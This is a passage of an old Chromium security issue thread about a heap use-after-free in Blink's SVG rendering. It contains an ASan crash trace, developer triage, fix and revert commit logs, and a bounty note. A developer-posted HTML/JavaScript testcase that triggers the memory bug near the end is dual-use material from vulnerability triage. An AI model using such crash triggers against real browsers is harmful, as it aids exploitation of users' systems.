    #27 0x7f8e6f4722c9 in base::RunLoop::Run() out/Release/../../base/run_loop.cc:45
    #28 0x7f8e6f43455d in base::MessageLoop::Run() out/Release/../../base/message_loop.cc:321
    #29 0x7f8e7486f98d in content::RendererMain(content::MainFunctionParams const&) out/Release/../../content/renderer/renderer_main.cc:234
Shadow bytes around the buggy address:
  0x0c26800d19c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c26800d19d0: 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c26800d19e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c26800d19f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c26800d1a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
=>0x0c26800d1a10: fa fa fa fa fa fa fa fa fd fd fd[fd]fd fd fd fd
  0x0c26800d1a20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c26800d1a30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c26800d1a40: fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c26800d1a50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c26800d1a60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==27438==ABORTING
[0503/083249:ERROR:nacl_helper_linux.cc(262)] NaCl helper process running without a sandbox!
Most likely you need to configure your SUID sandbox correctly


### in...@chromium.org (2013-05-03)

Is the m_clients updated when renderer is removed ?

void RenderSVGResourceContainer::markAllClientsForInvalidation(InvalidationMode mode)
{
    if ((m_clients.isEmpty() && m_clientLayers.isEmpty()) || m_isInvalidating)
        return;

    m_isInvalidating = true;
    bool needsLayout = mode == LayoutAndBoundariesInvalidation;
    bool markForInvalidation = mode != ParentOnlyInvalidation;

    HashSet<RenderObject*>::iterator end = m_clients.end();
    for (HashSet<RenderObject*>::iterator it = m_clients.begin(); it != end; ++it) {
        RenderObject* client = *it;

### pd...@chromium.org (2013-05-03)

[Empty comment from Monorail migration]

### pd...@chromium.org (2013-05-06)

We really need a more reliable repro case in order to debug this further. I was unable to reproduce locally.

From the stacktrace, it looks like we're freeing the SVGSVGElement's renderer, then using it (accessed through m_clients) when detaching the clip element. It's not clear to me how a parent renderer (RenderSVGRoot) is destroyed before the child renderer (RenderSVGResourceClipper), which is why I would like a better repro case.

@inferno, With normal teardown m_clients should be updated through SVGResourcesCache::removeResourcesFromRenderObject which will will remove any dead m_clients. In this case though, it does not need to be updated because the parent (RenderSVGRoot) should be alive when the child (RenderSVGResourceClipper) tries to use it. Somehow that is not true.

@inferno, can you investigate creating a more reliable repro? This should be a trivial fix if we have a nice repro.

### cl...@chromium.org (2013-05-06)

ClusterFuzz has detected this issue as fixed in range 188725:188791.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=172339628

Uploader: parisa@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x602e00017978
Crash State:
  - crash stack -
  WebCore::RenderObject::container
  WebCore::RenderObject::markContainingBlocksForLayout
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=188725:188791

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94digSBkfrp0lPkUjFLinb4rpW-tkFPENiPCz7eEB9199W2HzxFFdPMP1Xum2W4iANaFFSFPJ_6Vvacvvp5cS1Li7pY7yOSkiR6LNDIyv06Zs3pE8GZFtTjmutqu9cB4jfOKYoc6iclWDT8UAof3WF-MyZyts287hjI52ILlXXMbIcXRDk

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2013-05-06)

ignore last comment, this test was always flaky.

### in...@chromium.org (2013-05-06)

https://src.chromium.org/viewvc/blink?view=rev&revision=149745

### bu...@chromium.org (2013-05-06)

------------------------------------------------------------------------
r149745 | inferno@chromium.org | 2013-05-06T17:12:25.467257Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderObject.cpp?r1=149745&r2=149744&pathrev=149745

Improve mitigation from r109406 to reset layout root in cases when document is getting destroyed.

BUG=209604
TEST=No test since it is flaky and will be tracked in a seperate functional bug to analyze why RenderSVGRoot is left as a layout root. Fix tested under ASAN.
R=schenney@chromium.org

Review URL: https://codereview.chromium.org/14846011
------------------------------------------------------------------------

### in...@chromium.org (2013-05-06)

btw, if you want to analyze the functional bug, use this testcase below and you will hit the assert in layout root function [clearLayoutRootIfNeeded].

<html>
  <head>
    <script>
      onload = function() {
        el0=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        document.body.appendChild(el0)
        el1=document.createElementNS('http://www.w3.org/2000/svg', 'rect')
        el0.appendChild(el1)

        el2=document.createElementNS('http://www.w3.org/2000/svg', 'svg')
        document.body.appendChild(el2)
        el3=document.createElementNS('http://www.w3.org/2000/svg', 'clipPath')
        el3.setAttribute('id','el3')
        el2.appendChild(el3)

        setTimeout(function() {
          el2.setAttribute('clip-path', 'url(#el3)')
          el4=document.createElementNS('http://www.w3.org/2000/svg', 'animate')
          el1.appendChild(el4)
          el4.setAttribute('attributeName', 'x')
          el4.setAttribute('dur', '100ms')
          setTimeout("location.reload()", 20);
        }, 10)
      }
    </script>
  </head>
  <body>
  </body>
</html>

### bu...@chromium.org (2013-05-06)

------------------------------------------------------------------------
r149769 | fsamuel@chromium.org | 2013-05-06T18:47:11.653224Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderObject.cpp?r1=149769&r2=149768&pathrev=149769

Revert 149745 "Improve mitigation from r109406 to reset layout r..."

> Improve mitigation from r109406 to reset layout root in cases when document is getting destroyed.
> 
> BUG=209604
> TEST=No test since it is flaky and will be tracked in a seperate functional bug to analyze why RenderSVGRoot is left as a layout root. Fix tested under ASAN.
> R=schenney@chromium.org
> 
> Review URL: https://codereview.chromium.org/14846011

TBR=inferno@chromium.org

Review URL: https://codereview.chromium.org/15005003
------------------------------------------------------------------------

### in...@chromium.org (2013-05-06)

This was reverted incorrectly. created https://code.google.com/p/chromium/issues/detail?id=238363.

### in...@chromium.org (2013-05-06)

Tests skipped in https://src.chromium.org/viewvc/blink?view=rev&revision=149792. Revert of revert in r149793.

### bu...@chromium.org (2013-05-06)

------------------------------------------------------------------------
r149793 | inferno@chromium.org | 2013-05-06T20:54:51.355892Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/rendering/RenderObject.cpp?r1=149793&r2=149792&pathrev=149793

Revert 149769 "Revert 149745 "Improve mitigation from r109406 to..."
See https://crbug.com/chromium/238363

> Revert 149745 "Improve mitigation from r109406 to reset layout r..."
> 
> > Improve mitigation from r109406 to reset layout root in cases when document is getting destroyed.
> > 
> > BUG=209604
> > TEST=No test since it is flaky and will be tracked in a seperate functional bug to analyze why RenderSVGRoot is left as a layout root. Fix tested under ASAN.
> > R=schenney@chromium.org
> > 
> > Review URL: https://codereview.chromium.org/14846011
> 
> TBR=inferno@chromium.org
> 
> Review URL: https://codereview.chromium.org/15005003

TBR=fsamuel@chromium.org

Review URL: https://codereview.chromium.org/15016003
------------------------------------------------------------------------

### sc...@gmail.com (2013-05-28)

M27 is r151289
M28 is r151290 and r151291

### sc...@gmail.com (2013-06-03)

$1000

### pa...@chromium.org (2013-06-24)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/209604?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077206)*
